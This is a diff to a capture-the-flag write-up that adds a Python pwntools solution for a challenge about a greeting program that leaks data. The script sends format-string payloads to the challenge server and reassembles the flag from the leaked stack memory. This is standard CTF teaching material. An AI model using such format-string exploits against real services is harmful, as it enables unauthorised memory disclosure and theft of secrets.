@@ -8,7 +8,30 @@ This program I developed will greet you, but my friend said it is leaking data l
 
 #### Solution:
 
-```bash
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+from struct import *
+
+r = remote('pwn-2021.duc.tf', 31918  )
+# r = process('./hellothere')
+
+print(r.recvuntil(b'?').decode('utf-8').strip())
+
+secret = ""
+for i in range(12, 22):
+    r.sendline(('%' + str(i)+ '$lx').encode('utf-8'))
+    msg = r.recvuntil(b'?').decode('utf-8').strip()
+    msg = msg.split(',')[1].split('\n')[0].split(' ')[1]
+    msg = ''.join([ msg[i:i+2] for i in range(0, len(msg), 2) ][::-1])
+    try:
+        secret += bytes.fromhex(msg).decode('utf-8')
+    except:
+        break
+
+print(secret)
+r.close()
 ```
 
 ---
